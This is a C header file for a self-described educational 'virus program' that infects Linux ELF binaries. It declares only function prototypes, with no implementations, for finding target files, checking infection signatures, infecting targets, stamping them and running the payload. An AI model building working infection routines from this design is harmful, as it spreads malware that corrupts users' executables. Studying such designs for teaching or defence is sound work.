/*
 * file_utilities.h
 *
 * Created on: Jan 3, 2022
 * Note: This piece of software is designed only for learning and training purposes.
 * Building a virus program with relatively ease should increase your awareness on system vulnerabilities at all times.
 */

#ifndef SRC_FILE_UTILITIES_H_
#define SRC_FILE_UTILITIES_H_

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>  //The <fcntl.h> header defines the following requests and arguments for use by the functions fcntl() and open().
#include <unistd.h> //The <unistd.h> header defines miscellaneous symbolic constants and types, and declares miscellaneous functions.
#include <sys/wait.h> //The <sys/wait.h> header shall define the symbolic constants for use with waitpid()
#include <sys/time.h> //The <sys/stat.h> header shall define the structure of the data returned by the fstat(), lstat(), and stat() functions.
#include <stdbool.h>


long what_is_the_file_length(char *file_name);

/* *** ELF goes for the abbreviation for Executable and Linkable Format and defines the structure for binaries, libraries, and core files.
 * *** Read more https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/
 * */
int verify_is_elf(char *file_name);

int verify_if_is_infected(char *file_name, char *virus_signature,int length_of_signature);
int verify_is_original_file(char * file_name); // do not infect oneself :)
char *search_for_target(char *virus_signature, long length_of_signature);
void execute_virus_mission();
void stamp_the_infected_file(char *file_name, char *virus_signature);

int go_infect_the_target_file(char *target_file_name,char *virus_binary_file_name, long size_of_virus, long length_of_signature);
void extract_action_from_virus(char *binary_virus_filename, char *temporary_file_name, long size_of_virus, long length_of_signature);
void execute_action(char *file_name, char *argv[], char *temporary_file_name, long size_of_virus, long length_of_signature);

#endif /* SRC_FILE_UTILITIES_H_ */
